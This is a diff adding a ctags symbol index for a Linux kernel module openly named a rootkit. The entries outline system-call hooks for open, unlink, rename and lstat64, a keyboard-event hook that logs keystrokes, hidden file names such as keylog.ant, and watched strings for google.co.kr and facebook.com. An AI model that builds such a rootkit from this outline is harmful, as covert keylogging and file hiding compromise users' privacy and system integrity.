@@ -1,0 +1,118 @@
+!_TAG_FILE_FORMAT	2	/extended format; --format=1 will not append ;" to lines/
+!_TAG_FILE_SORTED	1	/0=unsorted, 1=sorted, 2=foldcase/
+!_TAG_PROGRAM_AUTHOR	Darren Hiebert	/dhiebert@users.sourceforge.net/
+!_TAG_PROGRAM_NAME	Exuberant Ctags	//
+!_TAG_PROGRAM_URL	http://ctags.sourceforge.net	/official site/
+!_TAG_PROGRAM_VERSION	5.8	//
+CHAR_DEV	char_dev.h	4;"	d
+CHAR_DEV_MAJOR	char_dev.h	5;"	d
+DUMMY_FILE_NAME	sys_func_hook.h	8;"	d
+FILENAME_ARRAY	sys_func_hook.h	4;"	d
+FILE_NAME1	sys_func_hook.h	6;"	d
+FILE_NAME2	sys_func_hook.h	7;"	d
+KDIR	Makefile	/^KDIR := \/lib\/modules\/$(shell uname -r)\/build$/;"	m
+KEY_0	char_scancode.h	30;"	d
+KEY_1	char_scancode.h	31;"	d
+KEY_2	char_scancode.h	32;"	d
+KEY_3	char_scancode.h	33;"	d
+KEY_4	char_scancode.h	34;"	d
+KEY_5	char_scancode.h	35;"	d
+KEY_6	char_scancode.h	36;"	d
+KEY_7	char_scancode.h	37;"	d
+KEY_8	char_scancode.h	38;"	d
+KEY_9	char_scancode.h	39;"	d
+KEY_A	char_scancode.h	3;"	d
+KEY_ALT	char_scancode.h	46;"	d
+KEY_B	char_scancode.h	4;"	d
+KEY_BACKSPCE	char_scancode.h	41;"	d
+KEY_C	char_scancode.h	5;"	d
+KEY_CAPS_LOCK	char_scancode.h	48;"	d
+KEY_CTRL	char_scancode.h	44;"	d
+KEY_D	char_scancode.h	6;"	d
+KEY_DOT	char_scancode.h	45;"	d
+KEY_E	char_scancode.h	7;"	d
+KEY_ENTER	char_scancode.h	43;"	d
+KEY_F	char_scancode.h	8;"	d
+KEY_G	char_scancode.h	9;"	d
+KEY_H	char_scancode.h	10;"	d
+KEY_I	char_scancode.h	11;"	d
+KEY_J	char_scancode.h	12;"	d
+KEY_K	char_scancode.h	13;"	d
+KEY_L	char_scancode.h	14;"	d
+KEY_M	char_scancode.h	15;"	d
+KEY_N	char_scancode.h	16;"	d
+KEY_O	char_scancode.h	17;"	d
+KEY_P	char_scancode.h	18;"	d
+KEY_Q	char_scancode.h	19;"	d
+KEY_R	char_scancode.h	20;"	d
+KEY_S	char_scancode.h	21;"	d
+KEY_SPACE	char_scancode.h	47;"	d
+KEY_T	char_scancode.h	22;"	d
+KEY_TAB	char_scancode.h	42;"	d
+KEY_U	char_scancode.h	23;"	d
+KEY_V	char_scancode.h	24;"	d
+KEY_W	char_scancode.h	25;"	d
+KEY_X	char_scancode.h	26;"	d
+KEY_Y	char_scancode.h	27;"	d
+KEY_Z	char_scancode.h	28;"	d
+PROC_FILE	init.c	16;"	d	file:
+PWD	Makefile	/^PWD := $(shell pwd)$/;"	m
+__CHAR_DEV_H__	char_dev.h	2;"	d
+__KBD_H__	kbd.h	2;"	d
+__SYS_FUNC_HOOK_H__	sys_func_hook.h	2;"	d
+__UTILES_H__	utils.h	2;"	d
+__this_module	rootkit.mod.c	/^struct module __this_module$/;"	v	typeref:struct:module
+__used	rootkit.mod.c	/^__used$/;"	v	file:
+__used	rootkit.mod.c	/^__used$/;"	v	typeref:struct:____versions	file:
+__used	rootkit.mod.c	/^static const struct rheldata _rheldata __used$/;"	v	typeref:struct:_rheldata	file:
+buffer	init.c	/^char buffer[30];$/;"	v
+char_dev_init	char_dev.c	/^void char_dev_init(void)$/;"	f
+char_dev_term	char_dev.c	/^void char_dev_term(void)$/;"	f
+find_str	utils.c	/^bool find_str(const char * target, const char * find_str, int find_str_len)$/;"	f
+h_handle	kbd.c	/^static struct input_handle * h_handle;$/;"	v	typeref:struct:input_handle	file:
+insert_check	kbd.c	/^inline int insert_check(unsigned int event_type, unsigned int event_code, int value)$/;"	f
+kbd_init	kbd.c	/^int kbd_init(void)$/;"	f
+kbd_term	kbd.c	/^void kbd_term(void)$/;"	f
+key_processor	kbd.c	/^inline void key_processor(unsigned long scancode)$/;"	f
+mask	char_dev.c	/^int mask = 0;$/;"	v
+my_proc_read	init.c	/^static int my_proc_read(char * page, char **start, off_t off, int count, int *eof, void * data)$/;"	f	file:
+my_proc_write	init.c	/^static int my_proc_write(struct file *file, const char __user *buffer, unsigned long count, void *data)$/;"	f	file:
+obj-m	Makefile	/^obj-m := rootkit.o$/;"	m
+org_kbd_event	kbd.c	/^static void (*org_kbd_event)(struct input_handle *handle, unsigned int event_type, unsigned int event_code, int value);$/;"	v	file:
+p_input_handler	kbd.c	/^static struct input_handler * p_input_handler=(struct input_handler*)0xc0a6e3e0;  \/\/ kallsyms$/;"	v	typeref:struct:input_handler	file:
+poll_open	char_dev.c	/^int poll_open(struct inode * inode, struct file * filp)$/;"	f
+poll_poll	char_dev.c	/^ssize_t poll_poll(struct file * filp, struct poll_table_struct * wait)$/;"	f
+poll_read	char_dev.c	/^ssize_t poll_read(struct file * filp, char * buf, size_t count, loff_t * f_pos)$/;"	f
+poll_release	char_dev.c	/^int poll_release(struct inode * inode, struct file * filp)$/;"	f
+poll_write	char_dev.c	/^ssize_t poll_write(struct file * filp, const char * buf, size_t count, loff_t * f_pos)$/;"	f
+pro_filename	sys_func_hook.c	/^const char * pro_filename[FILENAME_ARRAY] = {"secret.docx", "\/secret.docx", "keylog.ant", "\/keylog.ant"};$/;"	v
+proc_init	init.c	/^inline void proc_init(void)$/;"	f
+proc_term	init.c	/^inline void proc_term(void)$/;"	f
+pseudo_kbd_event	kbd.c	/^static void pseudo_kbd_event(struct input_handle *handle, unsigned int event_type, unsigned int event_code, int value)$/;"	f	file:
+pseudo_sys_lstat64	sys_func_hook.c	/^asmlinkage long pseudo_sys_lstat64(char __user * filename, struct stat64 __user * statbuf)$/;"	f
+pseudo_sys_open	sys_func_hook.c	/^asmlinkage long pseudo_sys_open(char * filename, int flags, int mode)$/;"	f
+pseudo_sys_rename	sys_func_hook.c	/^asmlinkage int pseudo_sys_rename(const char __user *oldname, const char __user *newname)$/;"	f
+pseudo_sys_unlink	sys_func_hook.c	/^asmlinkage long pseudo_sys_unlink(const char __user * pathname)$/;"	f
+pseudo_sys_unlinkat	sys_func_hook.c	/^asmlinkage int pseudo_sys_unlinkat(int dfd, const char __user * pathname, int flag)$/;"	f
+read_start	char_dev.c	/^int read_start = 5;$/;"	v
+rootkit-y	Makefile	/^rootkit-y := init.o char_dev.o sys_func_hook.o utils.o kbd.o$/;"	m
+rootkit_exit	init.c	/^module_exit(rootkit_exit);$/;"	v
+rootkit_exit	init.c	/^void __exit rootkit_exit(void)$/;"	f
+rootkit_init	init.c	/^int __init rootkit_init(void)$/;"	f
+rootkit_init	init.c	/^module_init(rootkit_init);$/;"	v
+scancode_str1	kbd.c	/^static const unsigned int scancode_str1[]={KEY_G, KEY_O, KEY_O, KEY_G, KEY_L, KEY_E, KEY_DOT, KEY_C, KEY_O, KEY_DOT, KEY_K, KEY_R};  \/\/ google.co.kr$/;"	v	file:
+scancode_str2	kbd.c	/^static const unsigned int scancode_str2[]={KEY_F, KEY_A, KEY_C, KEY_E, KEY_B, KEY_O, KEY_O, KEY_K, KEY_DOT, KEY_C, KEY_O, KEY_M};  \/\/ facebook.com$/;"	v	file:
+scancode_to_string	kbd.c	/^inline char * scancode_to_string(const unsigned long scancode)$/;"	f
+start_user_command_run	init.c	/^inline void start_user_command_run(void)$/;"	f
+str1_cnt	kbd.c	/^static unsigned int str1_cnt = 0;$/;"	v	file:
+str1_len	kbd.c	/^static const unsigned int str1_len = sizeof(scancode_str1)\/4;$/;"	v	file:
+str2_len	kbd.c	/^static const unsigned int str2_len = sizeof(scancode_str2)\/4;$/;"	v	file:
+str_insert	kbd.c	/^inline void str_insert(void)$/;"	f
+sys_call_table	sys_func_hook.c	/^void** sys_call_table = (void**)0xc07ae328;$/;"	v
+sys_func_hook_init	sys_func_hook.c	/^void sys_func_hook_init(void)$/;"	f
+sys_func_hook_term	sys_func_hook.c	/^void sys_func_hook_term(void)$/;"	f
+temp_kbd_event	kbd.c	/^static void temp_kbd_event(struct input_handle *handle, unsigned int event_type, unsigned int event_code, int value)$/;"	f	file:
+to_small_letter	kbd.c	/^inline char * to_small_letter(const unsigned long scancode)$/;"	f
+to_special_characters	kbd.c	/^inline char * to_special_characters(const unsigned long scancode)$/;"	f
+vd_fops	char_dev.c	/^static struct file_operations vd_fops = {$/;"	v	typeref:struct:file_operations	file:
+wait_queue_read	char_dev.c	/^DECLARE_WAIT_QUEUE_HEAD(wait_queue_read);$/;"	v
